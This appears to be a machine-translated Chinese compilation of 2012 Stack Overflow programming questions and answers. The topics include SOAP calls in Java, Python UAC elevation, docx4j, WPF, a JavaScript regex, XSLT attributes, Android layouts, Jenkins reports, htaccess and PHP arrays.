                      "xmlns:tns=\"urn:registerwsdl\">"+
    "<your_feild_name xsi:type=\"xsd:string\">"+"your_value"+"</your_feild_name>"+

                      "</tns:register>"+

                               // "</SOAP-ENV:Body></SOAP-ENV:Envelope>",Name,Email,Password,Status,Type,Date];
                               "</SOAP-ENV:Body></SOAP-ENV:Envelope>"; 
```

然后在这个函数中使用这个信封，你可以用肥皂信封传递多个值

```
String CallWebService(String url,
            String soapAction,
           String envelope)  {
          final DefaultHttpClient httpClient=new DefaultHttpClient();
          // request parameters

          HttpParams params = httpClient.getParams();
             HttpConnectionParams.setConnectionTimeout(params, 20000);
             HttpConnectionParams.setSoTimeout(params, 25000);
             // set parameter
          HttpProtocolParams.setUseExpectContinue(httpClient.getParams(), true);

          // POST the envelope
          HttpPost httppost = new HttpPost(url);
          // add headers
             httppost.setHeader("soapaction", soapAction);
             httppost.setHeader("Content-Type", "text/xml; charset=utf-8");

             String responseString="";
             try {

              // the entity holds the request
           HttpEntity entity = new StringEntity(envelope);
           httppost.setEntity(entity);

           // Response handler

           ResponseHandler<String> rh=new ResponseHandler<String>() {
            // invoked when client receives response

               public String handleResponse(HttpResponse response)
              throws ClientProtocolException, IOException {

             // get response entity
             HttpEntity entity = response.getEntity();

             // read the response as byte array
                   StringBuffer out = new StringBuffer();
                   byte[] b = EntityUtils.toByteArray(entity);

                   // write the response byte array to a string buffer
                   out.append(new String(b, 0, b.length));

                   return out.toString();
            }
           };

           responseString=httpClient.execute(httppost, rh); 

          }
             catch (Exception e) {
              Log.v("exception", e.toString());
          }

             xml =  responseString.toString();
             // close the connection
             System.out.println("xml file ------"+xml);
          httpClient.getConnectionManager().shutdown();
          return responseString;
         } 
```

最后使用任何 XML 解析器解析 XML 输出。

# python - 在 python 脚本中请求 UAC 提升

> ID：13514393
> 
> 赞同：2
> 
> 时间：2012-11-22T14:04:34.593
> 
> 标签：python, uac

我需要我的 python 脚本来提升 UAC 权限。我一次又一次地尝试，无法弄清楚。

这是我现在的代码：

```
from win32com.shell.shell import ShellExecuteEx
from win32com.shell import shellcon
import win32process, win32event
import win32con
from ntsecuritycon import *

ASADMIN = 'asadmin'

if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    ShellExecuteEx(fMask=shellcon.SEE_MASK_NOCLOSEPROCESS,
                    lpVerb="runas",
                    lpFile=sys.executable,
                    lpParameters=params,
                    nShow=win32con.SW_SHOW)
    sys.exit(0) 
```

现在，到目前为止，我所掌握的信息是，它会毫无错误地运行，并且会自行重新打开。重新打开的脚本返回

```
["c:\\users\\justin\\UAC.py", "asadmin"] 
```

为了

```
sys.argv 
```

，但它仍然不允许我执行管理任务。

尽管修复此代码的帮助是最佳的，但我也准备尝试其他任何可行的方法，谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2020-05-02T04:23:04.967

使用以下内容：

```
import os
import sys
import win32com.shell.shell as shell
ASADMIN = 'asadmin'

if sys.argv[-1] != ASADMIN:
    script = os.path.abspath(sys.argv[0])
    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
    print("I am root now.") 
```

# java - 用图像 docx4j 替换文本

> ID：13514394
> 
> 赞同：1
> 
> 时间：2012-11-22T14:04:38.323
> 
> 标签：java, image, text, replace, docx4j

我有一个单词模板。有一张文字照片必须用图像替换。这必须使用 Docx4Java 来完成。

我该怎么做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T20:47:42.333

**披露：我管理 docx4j 项目**

**VariableReplace**代码不处理图像。

最好的方法是使用数据绑定内容控件，特别是通过 XPath 指向 XML 文档中 base-64 编码图像的图片内容控件（有关详细信息，请参阅入门）。

但是，如果您想用图像替换单词，您可以这样做，但您必须编写一些胶水代码。这很简单。

首先，找到单词。您可以使用 XPath 或 TraversalUtil 执行此操作（同样，请参阅入门了解详细信息）。

希望它本身正在运行（w：r / w：t）。如果没有，您需要拆分运行，以免替换相邻的文本。

然后，添加图像。请参阅示例**ImageAdd**。

我建议您查看在 Word 中添加图像时创建的 XML（即保存并解压缩您的 docx，然后查看 document.xml）。注意表示图像的 XML 处于正确的级别（例如 w:p 的子级）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-01-25T18:39:34.657

如果特别想用图像替换文本（使用上面回答的 docx4j 是不可能的），您可以使用将书签替换为图像作为替代方案。

只需打开您的模板 word 文件，将光标放在所需位置并插入-> 书签并命名您的书签。我按照[此处](https://www.programmersought.com/article/6413972878/)的说明将此书签替换为图像

# python - 如何使用更少的内存在dict python中存储数据

> ID：13514400
> 
> 赞同：0
> 
> 时间：2012-11-22T14:05:14.470
> 
> 标签：python

我有一些大约 1.5GB 的数据。现在我想将这些信息存储到 python 中的一个大字典中。但是，它的成本远大于 1.5GB，可能是 10 倍。机器没有那么多内存。有什么方法可以使用更少的内存将这些数据放入 dict 结构中？键和值都是整数。

此致，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:06:53.880

使用将键值对存储到磁盘并允许智能检索和索引的快速数据库，例如[`sqlite`](http://docs.python.org/2/library/sqlite3.html).

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:07:49.187

您应该尝试使用数据库，这样您就不必将所有数据存储在内存中。

伯克利数据库非常适合您使用，因为它只存储键值对。它是数据库形式的“字典”！

代码看起来像：

```
from bsddb3 import db
dbdict = DB()
dbdict.open("your database", None, db.DB_HASH, db.DB_CREATE)
dbdict[3]=2 #works just like a dict! 
```

以下是绑定：[Oracle Berkeley DB 的 Python“绑定”](http://www.jcea.es/programacion/pybsddb.htm)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-22T14:52:57.783

由于您的索引和数据是整数，您可以将数据保存在文件中并像访问数组一样访问它，但只有您正在处理的页面将在 RAM 中，其他页面将保留在磁盘上。

见[http://docs.python.org/2/library/mmap.html](http://docs.python.org/2/library/mmap.html)

mmap 是基于字节的，这意味着其中的索引将类似于您的体系结构上的 index*sizeof(int) ，您将需要读取 sizeof(int) 字节而不是仅一个字节，并使用 struct 模块（http： //docs.python.org/2/library/struct.html）将其转换为python整数。

如果所有数据都适合 RAM，则此解决方案比使用数组要慢一些，如果您的系统开始分页，则此解决方案将比使用普通数组更快。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-22T14:21:33.363

使用 pickle 对象将数据存储在字典中。请参阅此链接以使用泡菜[http://wiki.python.org/moin/UsingPickle](http://wiki.python.org/moin/UsingPickle)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-11-22T14:09:33.140

如果键是整数，则根据键的范围，您可以使用数组[http://docs.python.org/2/library/array.html](http://docs.python.org/2/library/array.html)而不是字典。您的键成为数组中的索引，仅此而已。这将比创建字典更节省内存。

如果您没有足够的 RAM 将所有数据放入一个数组中，那么可以使用 sqlite 或 Berkeley DB 之类的东西来有效地保存字典。当然，它会慢很多。

# c# - 文本框没有获得焦点

> ID：13514402
> 
> 赞同：0
> 
> 时间：2012-11-22T14:05:26.907
> 
> 标签：c#, wpf

我正在动态创建 DataGridTemplateColumn。

```
 var binding = new Binding
                    {

                        Path = new PropertyPath("MyProperty"),
                        UpdateSourceTrigger = UpdateSourceTrigger.LostFocus

                    };

                    var converterParameter = new List<object> { header, rows, myGrid };
                    binding.Converter = new MyConverter();
                    binding.ConverterParameter = converterParameter;

                    var textBoxValue = new FrameworkElementFactory(typeof(TextBox));
                    totalUnitsValue.SetBinding(TextBox.TextProperty, binding);
                    totalUnitsValue.SetValue(TextBox.HorizontalContentAlignmentProperty, HorizontalAlignment.Right);
                    totalUnitsValue.SetValue(TextBox.WidthProperty, 40.0);
                    totalUnitsValue.SetValue(TextBox.MarginProperty, new Thickness(4, 0, 10, 0));

var factoryElement = new FrameworkElementFactory(typeof(StackPanel));
                    factoryElement.SetValue(StackPanel.OrientationProperty, Orientation.Horizontal);
                    factoryElement.AppendChild(textBoxValue );

  var column = new DataGridTemplateColumn
            {
                Header = header,
                CellTemplate = new DataTemplate { VisualTree = factoryElement }
            };

            myGrid.Columns.Add(column); 
```

**这适用于少数列。但是，如果我创建 10 列或更多列 (80 -90) 文本框，那么最后创建的文本框不允许我更改值或不允许我将焦点放在文本框上。它变得像TextBlock。**

**编辑：**

如果我移除堆栈面板，那么文本框就没有问题，但我需要显示多个元素，所以我需要某种容器。任何帮助。

请指导可能是什么

# apache-flex - 将资产用作 RSL 时出现 flex 构建错误

> ID：13514404
> 
> 赞同：0
> 
> 时间：2012-11-22T14:05:31.373
> 
> 标签：apache-flex, build, flash-builder

您好最近我将资产文件夹中的所有图像转换为单独的 swc。我现在在构建路径中将 swc 称为 RSL。第一次成功了。但是现在每当我尝试构建项目时，构建都会失败并显示 java 堆错误。当我提到错误日志时。这是写在里面的。

```
!ENTRY com.adobe.flexbuilder.project 4 43 2012-11-22 15:12:15.797
!MESSAGE WARNING: setAssetClassAttribute - Unable to get definition for class GeneratedAsset11:null
!STACK 0
java.lang.Exception
at com.adobe.flexbuilder.project.internal.FlexProjectCore.createErrorStatus(FlexProjectCore.java:1019)
.....
.....
.....
.....
!ENTRY com.adobe.flexbuilder.project 4 43 2012-11-22 17:53:26.386
!MESSAGE Exception in design view callback:null
!STACK 0
java.lang.Exception
.......
.......
.......
!ENTRY org.eclipse.core.jobs 4 2 2012-11-22 18:07:48.821
!MESSAGE An internal error occurred during: "Build Project".
!STACK 0
java.lang.OutOfMemoryError: Java heap space 
```

任何指针为什么会发生这种情况？

# reporting-services - 以 4 列布局显示数据集

> ID：13514406
> 
> 赞同：0
> 
> 时间：2012-11-22T14:05:36.230
> 
> 标签：reporting-services

> **可能重复：**
> [SSRS - 如何构建简单的多列报告？](https://stackoverflow.com/questions/1015098/ssrs-how-to-build-a-simple-multi-column-report)

我有一份在 SSRS 中制作的报告，如下所示：

```
January
#data11
#data12
...

.
.
.

December
#data121
#data122
... 
```

有没有办法像这样布局报告：

```
January   February    March     April
data..    data...     data...   data...

May       June        July      August
data...   data...     Data..    data.. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T15:31:42.103

这里有一个建议：

*   取3个矩阵表
*   将一个放在另一个下方
*   按月对所有三个矩阵表分组

在组属性中为每个表添加过滤器（组属性中的过滤器选项卡），如下所示：

*   矩阵表 1：`month <=4`
*   矩阵表 2：`month >4 and month<=8`
*   矩阵表 3：`month >8 and month<=12`

# c# - 如何使用 C# 编写多语言桌面应用程序

> ID：13514407
> 
> 赞同：0
> 
> 时间：2012-11-22T14:05:36.667
> 
> 标签：c#, asp.net

大家好，我对 c# 非常陌生。我搜索了谷歌如何使用 c# 制作多语言日历，但我没有找到任何结果。我需要用这三种语言制作日历有什么帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:11:39.347

对于**桌面应用程序**

你必须改变当前的文化

```
 System.Threading.Thread.CurrentThread.CurrentCulture = System.Globalization.CultureInfo.CreateSpecificCulture("fr")
 System.Threading.Thread.CurrentThread.CurrentUICulture = System.Threading.Thread.CurrentThread.CurrentCulture 
```

检查此链接[http://support.microsoft.com/Default.aspx?scid=kb%3ben-us%3b889834&x=18&y=19](http://support.microsoft.com/Default.aspx?scid=kb;en-us;889834&x=18&y=19)

对于**网页**

只需更改页面文化和 UI 文化即可获得伊斯兰日历更改文化

```
<%@ Page UICulture="ar" Culture="ar-SA" %> 
```

公历：改回英文

```
<%@ Page UICulture="en" Culture="en-US" %> 
```

# javascript - 1个数字和3个大写字母的正则表达式

> ID：13514409
> 
> 赞同：3
> 
> 时间：2012-11-22T14:05:38.410
> 
> 标签：javascript, regex

我对正则表达式的研究不多，但我知道数字是`[0-9]`，大写字母是`[A-Z]`。

我想知道的是：如何从匹配正则表达式的字符串中过滤掉某些单词，并设置它们的样式。例如：

```
string s = 'Hello ABC1 world C2DF !';
//magic code here
//result:
'Hello <b>ABC1</b> world <b>C2DF</b> !' 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T14:09:33.793

这应该符合您的需求：

```
/[0-9][A-Z]{3}|[A-Z][0-9][A-Z]{2}|[A-Z]{2}[0-9][A-Z]|[A-Z]{3}[0-9]/ 
```

这匹配（并且仅匹配）：

```
0ABC
A0BC
AB0C
ABC0 
```

当然，在上面的列表中`A`，`B`和`C`可以是任何大写字符，也`0`可以是任何数字。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-22T14:09:34.290

使用这个正则表达式：

```
/\b(\d[A-Z]{3}|[A-Z]\d[A-Z]{2}|[A-Z]{2}\d[A-Z]|[A-Z]{3}\d)\b/ 
```

在 javascript 中使用[replace 方法](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/replace)：

```
s.replace(/\b(\d[A-Z]{3}|[A-Z]\d[A-Z]{2}|[A-Z]{2}\d[A-Z]|[A-Z]{3}\d)\b/g,"<b>$&</b>"); 
```

测试脚本：

```
var output,
    text    = "9GHJ is saying hello to ABC1 world C2DF, but 89UI is showing up with his friend HUIP, nothing to do, they are not welcome ! As garyh said, these NUMB3RZ should not be replaced",
    regex   = /\b(\d[A-Z]{3}|[A-Z]\d[A-Z]{2}|[A-Z]{2}\d[A-Z]|[A-Z]{3}\d)\b/g,
    replace = "<b>$&</b>";

output = text.replace(regex,replace)

console.log ( output ); 
```

将输出这个：

```
<b>9GHJ</b> is saying hello to <b>ABC1</b> world <b>C2DF</b>, but 89UI is showing up with his friend HUIP, nothing to do, they are not welcome ! As garyh said, these NUMB3RZ should not be replaced 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-22T14:45:13.880

要解决这个问题，您肯定需要[**单词边界**](http://www.regular-expressions.info/wordboundaries.html)。另一个解决方案也将匹配例如“1ABCD”并突出显示前四个字符。

我的解决方案涉及[向前看](http://www.regular-expressions.info/lookaround.html)，但如果您不希望这样做，只需将边界一词`\b`用于您自己的解决方案。

```
\b(?=[^\d]*\d[^\d]*)[A-Z\d]{4}\b 
```

[在 Regexr 上](http://regexr.com?32taa)查看

我将 4 个字符的单词与周围`[A-Z\d]{4}`的单词边界匹配`\b`，确保前面或前面没有其他字母或数字。正向前瞻`(?=[^\d]*\d[^\d]*)`确保满足您对一位数的要求。

# javascript - 如何在鼠标悬停时使 div 出现在图像上的特定区域标签上？

> ID：13514410
> 
> 赞同：0
> 
> 时间：2012-11-22T14:05:39.460
> 
> 标签：javascript, jquery, html, css, image

我有一些 javascript 可以连续向左移动图像。当您将鼠标悬停在图像上时，我希望停止滚动，并且我希望在鼠标悬停的任何区域标签上显示一个带有一些自定义文本的略微透明的 div。

这是我正在使用的 JS，我注释掉了应该发生的事情。我该怎么做？

```
$(document).ready(function() {
                var date = new Date();
                var style = "day"
                if (date.getHours() >= 17 && date.getHours() <=5) {
                    style="night";
                }
                setInterval(wells_fancy_slider, 50);
                $('area').hover(function() {
                                    // here is where the code should go
                    paused = true;
                }, function() {
                                    // here is where you hide the div
                    paused = false;
                })
            })

            function wells_fancy_slider() {
                if (!paused) {
                    if (parseInt($('#pic1').css('left')) < -2770) {
                        $('#pic1').css('left', '5586');
                    }
                    if (parseInt($('#pic2').css('left')) < -2770) {
                        $('#pic2').css('left', '5586');
                    }
                    if (parseInt($('#pic3').css('left')) < -2770) {
                        $('#pic3').css('left', '5586');
                    }
                    $('#pic1, #pic2, #pic3').css('left', '-=5');
                }
            } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:32:55.600

试试这个。。

```
t = setInterval(wells_fancy_slider, 50);

$('#area').hover(function(e) {
    clearInterval(t);
    var parentOffset = $(this).offset(); // or $(this).parent().offset();
    var x = e.pageX - parentOffset.left;
    var y = e.pageY - parentOffset.top;

    paused = true;
}, function() {
    clearInterval(t);
    t = setInterval(wells_fancy_slider, 50);
    paused = false;
}); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-22T14:10:58.197

不确定它是否适合您的需求：

**CSS：**

`#mydiv{position:absolute;display:none}`

```
 $('area').hover(function() {                

   $('mydiv').offset({ top: $(this).offset().top, left: $(this).offset().left}).fadeIn();
                paused = true;
            }, function() {
                   $('#mydiv').hide();
                paused = false;
            }) 
```

# asp.net-mvc - 动态重写 Razor 嵌套布局堆栈

> ID：13514411
> 
> 赞同：0
> 
> 时间：2012-11-22T14:05:40.533
> 
> 标签：asp.net-mvc, asp.net-mvc-3, razor

我正在尝试通过使用自定义视图引擎根据与当前 HttpContext 关联的主题动态添加视图搜索位置来向应用程序添加主题支持。

这对于原始视图非常有效，因为位置是按顺序搜索的，如果相关主题文件夹中存在视图，则使用该视图，否则它将回退到标准位置中的默认视图。

但是，我们广泛使用嵌套布局，通常**至少三层深度**（因此仅重写当前视图的布局将不起作用），并且 Razor 布局不使用视图引擎来解析，因为它们通常被指定为完整的应用程序根目录的路径。

例如，如果我在视图中有以下内容：

```
@{ Layout = "~Views/Shared/OneColumn.cshtml"; } 
```

我知道我可以实现这样的东西：

```
@{ Layout = ThemeHelper.GetLayoutPath("OneColumn.cshtml"); } 
```

但如果可能的话，我更愿意做的是：

```
@{ Layout = "OneColumn.cshtml"; } 
```

并让视图引擎或任何可扩展点使用与应用于主视图相同的规则将其解决为最佳匹配。

有任何想法吗？

# android - ExpandableListView 采用父视图的所有宽度。安卓

> ID：13514412
> 
> 赞同：1
> 
> 时间：2012-11-22T14:05:41.550
> 
> 标签：android, user-interface, expandablelistview

ExpandableListView 采用父视图的所有宽度。安卓。我将其声明为：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="horizontal" >

<ExpandableListView
    android:id="@+id/exListView"
    android:layout_width="wrap_content"
    android:layout_height="match_parent"
    android:childIndicatorLeft="0dp"
    android:divider="@android:color/transparent"
    android:groupIndicator="@drawable/list_view_group_indicator"
    android:smoothScrollbar="true" />

<LinearLayout
    android:layout_width="0dip"
    android:layout_height="match_parent"
    android:background="@android:color/black" >
</LinearLayout> 
```

组视图声明为：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="wrap_content"
android:layout_height="wrap_content" >

<ImageView
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:src="@drawable/transparent" />
</LinearLayout> 
```

子视图声明为：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:orientation="vertical" >

<ImageButton
    android:id="@+id/buttonChild"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:src="@drawable/ic_launcher" />

<TextView
    android:id="@+id/child_button_name"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" />
</LinearLayout> 
```

但是 ExpandableListView 仍然占用父视图的所有宽度。可能是什么原因？所有声明为 wrap_content 的子视图

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T14:46:42.973

不要在 ListView 上使用 WRAP_CONTENT。

测量包含数千个项目的 ListView 可能是一项非常漫长的操作。

您应该始终设置 MATCH_PARENT 或在 DIP 中指定宽度或高度。

# android - MvvmCross Android - 错误膨胀类 Mvx.MvxBindableListView

> ID：13514417
> 
> 赞同：1
> 
> 时间：2012-11-22T14:06:10.217
> 
> 标签：android, mono, xamarin.android, mvvmcross

我在 Mono for Android 中使用 MvvmCross 的活动时遇到问题。基本上，应用程序编译并运行，但是当我调用 SetContentView 时出现未处理的异常：

“Android.Views.InflateException：二进制 XML 文件第 1 行：膨胀类 Mvx.MvxBindableListView 时出错”

在堆栈跟踪中，它提到未找到的类是原因。

这是我的活动：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using Android.App;
using Android.Content;
using Android.OS;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using Cirrious.MvvmCross.Droid.Views;
using WshLst.Core.ViewModels;
using WshLst.Core.Models;

namespace WshLst.MonoForAndroid.Views
{
    [Activity(Label = "Wsh Lst - Login")]
    public class LoginView : MvxActivityView<LoginViewModel>
    {
        ListView list;

        protected override void OnViewModelSet()
        {
            RequestWindowFeature(WindowFeatures.ActionBar);

            SetContentView(Resource.Layout.Page_LoginView);

            list = this.FindViewById<ListView>(Resource.Id.mvxList);

            list.ItemClick += (s, e) =>
            {
                var item = list.Adapter.GetItem(e.Position);

                var castItem = (Cirrious.MvvmCross.Binding.Droid.MvxJavaContainer)item;

                this.ViewModel.Login((WshLst.Core.Models.LoginPlatform)castItem.Object);
            };
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-22T14:22:44.847

## tl;博士

您的活动需要继承自`MvxBindingActivityView`而不是`MvxActivityView`

## 背后的故事

MvvmCross 内置在层和模块中：

*   Cirrious.MvvmCross - 只提供核心 INotifyPropertyChanged 和导航
*   Cirrious.MvvmCross.Binding - 为您提供 Droid 和 Touch 的数据绑定
*   Cirrious.MvvmCross.Dialog - 为您提供 monotouch/droid/*更多*对话框助手
*   Cirrious.MvvmCross.AutoViews - 这可能有一天会为您提供自动默认 UI 视图
*   插件 - 每个插件都为您提供特定的功能 - 例如 SQLite

这个想法是试图为那些只想要最低限度的人提供一个“轻量级”的核心框架，但为那些想要更多的人提供一个更复杂的框架。

这样做的缺点是某些名称可能会令人困惑......有更多的 dll 可供参考......并且用户有时可以从错误的级别对象继承 - 这就是您的问题所在：

*   你继承的`MvxActivityView`有一个`ViewModel`
*   但它也没有`MvxBindingActivityView`具有约束力的支持。

[在 MvvmCross monodroid Activity 中插入 Monogame 视图](https://stackoverflow.com/questions/13201174/insert-a-monogame-view-inside-mvvmcross-monodroid-activity)中的 2 层中有更多信息

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-12T17:50:27.980

新原因：MvxBindableListView 重命名为 MvxListView。但是上面的内容现在令人困惑。因为我是从 MvxFragment 继承的，所以我认为这是原因，并试图理解和实现 Stuart 所写的内容......然后我想起了一些关于重命名类的事情，然后很快就找到了 :)

# xslt - 使用 xslt 提取属性

> ID：13514419
> 
> 赞同：0
> 
> 时间：2012-11-22T14:06:26.680
> 
> 标签：xslt

我在一个文件中有以下 xml 内容：

```
<testsuite errors="1" failures="1" name="unittest.suite.TestSuite" tests="3" time="6.540">
  <properties>
    <property name="comp1" value="0.0.0.0:80=0.0.1"/>
    <property name="comp2" value="12.34.56.78:80=0.0.1"/> 
```

我想创建一个像

```
Name  Value
comp1 0.0.0.0:80=0.0.1
comp2 12.34.56.78:80=0.0.1 
```

带有 xsl。我尝试了以下

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>    
    <table border="1">
      <tr bgcolor="#9acd32">
        <th>Name</th>
        <th>Value</th>
      </tr>
      <xsl:for-each select="testsuite/properties/property">
      <tr>
        <td><xsl:value-of select="name"/></td>
        <td><xsl:value-of select="value"/></td>
      </tr>
      </xsl:for-each>
    </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet> 
```

这只是给出了一个空表。如何正确执行此操作？我只在互联网上找到了一些复杂的例子。如果有人知道关于这些事情的好教程，我也很受欢迎。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-22T14:24:18.937

`@`用于属性，如果您不使用，则默认情况下将其视为元素..

因此，如果 XML 是这样的，您的代码可以正常工作：

```
<testsuite errors="1" failures="1" name="unittest.suite.TestSuite" tests="3" time="6.540">
  <properties>
    <property>
      <name>comp1</name>
      <value>0.0.0.0:80=0.0.1</value>
    </property>
    <property>
      <name>comp2</name>
      <value>12.34.56.78:80=0.0.1</value>
    </property>
    ..........
    ........ 
```

这是您更正的代码，请观察`@`

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>    
    <table border="1">
      <tr bgcolor="#9acd32">
        <th>Name</th>
        <th>Value</th>
      </tr>
      <xsl:for-each select="testsuite/properties/property">
      <tr>
        <td><xsl:value-of select="@name"/></td>
        <td><xsl:value-of select="@value"/></td>
      </tr>
      </xsl:for-each>
    </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-22T14:11:35.820

尝试

```
 <td><xsl:value-of select="@name"/></td>
    <td><xsl:value-of select="@value"/></td> 
```

访问名称之前需要的属性时`@`。

# ant - 在 Jenkins 中通过电子邮件发布 HTML 测试报告？

> ID：13514421
> 
> 赞同：3
> 
> 时间：2012-11-22T14:06:32.390
> 
> 标签：ant, selenium, junit, jenkins, report

我正在使用詹金斯和蚂蚁。我在 Jenkins 中运行 Selenium 和 JUnit 测试。我能够为开发人员生成 HTML 报告和电子邮件。我想在电子邮件中发布 Jenkins 单元测试图和 HTML 结果。所以图表应该包含在实际的电子邮件中，而不仅仅是作为链接。

我已经尝试在电子邮件中发布测试结果时使用 Jelly HTML 脚本。这是非常基本的，并没有真正提供足够的信息。

关于如何在电子邮件中很好地报告单元测试图和通过/失败的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T15:22:45.590

您可以以纯文本形式总结 Jenkins 报告中的一些关键点（如通过：25、失败：3 等）。在您找到真正的解决方案之前，可能是一种解决方法..

# apache - htaccess 拒绝来自主域的子文件夹，但如果由他自己的域链接则允许

> ID：13514423
> 
> 赞同：0
> 
> 时间：2012-11-22T14:06:44.333
> 
> 标签：apache, .htaccess

我在同一台服务器上有更多域。文件系统是这样的

/index.php /page.php /
.....
/folder-for-domains/
/folder-for-domains/domain1.com-folder/
/folder-for-domains/domain2.com-folder/

domain.com 指向 / 而其他域指向 /folder-for-domains/domain1.com-folder/ 或 /folder-for-domains/domain2.com-folder/

我想阻止来自 domain.com 的子域文件夹，但如果与他自己的域（domain1.com 或 domain2.com）链接，则允许这些文件夹

htaccess 可以吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-22T14:14:10.190

您应该能够做到这一点，但添加一个`RewriteCond`检查`Host`标头值的语句，然后 a`RewriteRule`拒绝访问。

我认为也应该可以通过使用`SetEnvIf`然后`Deny from`声明来实现这一点

# hadoop - 在 hadoop 多集群环境上运行 nutch 时出错

> ID：13514429
> 
> 赞同：0
> 
> 时间：2012-11-22T14:06:56.003
> 
> 标签：hadoop, nutch

我在 hadoop 多集群环境中运行 nutch。

使用以下命令执行 nutch 时，Hadoop 抛出错误

$ bin/hadoop jar /home/nutch/nutch/runtime/deploy/nutch-1.5.1.job org.apache.nutch.crawl.Crawl urls -dir urls -depth 1 -topN 5

错误：线程“主”java.io.IOException中的异常：不是文件：org.apache.hadoop.mapred.FileInputFormat.getSplits（FileInputFormat.java： 170) 在 org.apache.hadoop.mapred.JobClient.submitJob(JobClient.java:515) 在 org.apache.hadoop.mapred.JobClient.runJob(JobClient.java:753) 在 com.bdc.dod.dashboard.BDCQueryStatsViewer .run(BDCQueryStatsViewer.java:829) at org.apache.hadoop.util.ToolRunner.run(ToolRunner.java:65) at com.bdc.dod.dashboard.BDCQueryStatsViewer.main(BDCQueryStatsViewer.java:796) at sun。 reflect.NativeMethodAccessorImpl.invoke0(Native Method) 在 sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) 在 sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) 在 java.lang.reflect.Method.invoke(Method.java:585) 在 org.apache.hadoop.util.RunJar.main(RunJar.java:155)

我尝试了解决此问题的可能方法并修复了所有问题，例如在 /local/conf 路径中设置 http.agent.name 等。我之前安装过并且很顺利。

有人可以提出解决方案吗？

顺便说一句，我按照[链接](http://www.rui-yang.com/develop/build-nutch-1-4-cluster-with-hadoop/)进行安装和运行。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T01:40:49.253

我可以解决这个问题。将文件从本地文件系统复制到 HDFS 目标文件系统时，它曾经是这样的：bin/hadoop dfs -put ~/nutch/urls urls。

但是它应该是“bin/hadoop dfs -put ~/nutch/urls/* urls”，这里 urls/* 将允许子目录。

# haskell - 在 Haskell 中呈现矩阵

> ID：13514432
> 
> 赞同：1
> 
> 时间：2012-11-22T14:07:16.167
> 
> 标签：haskell

> **可能重复：**
> [Haskell 线性代数？](https://stackoverflow.com/questions/2343313/haskell-linear-algebra)

我想知道是否有任何标准库可以在 Haskell 中呈现矩阵及其所有运算符？我对 Haskell 很陌生，所以如果你有处理矩阵的经验，如果可以的话，请给我一些例子。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-22T14:31:12.110

我没有第一手经验，但[hmatrix](http://hackage.haskell.org/package/hmatrix)是 Haskell 中矩阵的首选包。

至于例子，包文件里有几十个好例子，在“examples”目录下。您可以通过运行获取包文件`cabal unpack hmatrix`，或者直接[在此处](http://hackage.haskell.org/packages/archive/hmatrix/0.14.1.0/hmatrix-0.14.1.0.tar.gz)下载。

# php - 从单个数组创建多维数组

> ID：13514434
> 
> 赞同：0
> 
> 时间：2012-11-22T14:07:16.067
> 
> 标签：php

我有一个 html 表单，我在其中使用这样的数组（name="courts[]"）。当它将数据发送到 php 文件时，我使用 foreeach 循环创建多维数组以在 mysql 中插入记录。在 php 文件中，我编写了 foreeach 循环来像这样迭代

```
 $data = array();
    $i = 0;
    foreach ($court_name as $result)
    {
        $data[] = array(
            'court_name' => $result[0]
        );
        $i++;
    } 
```

它显示结果这个

```
 Array
 (
      [0] => Array
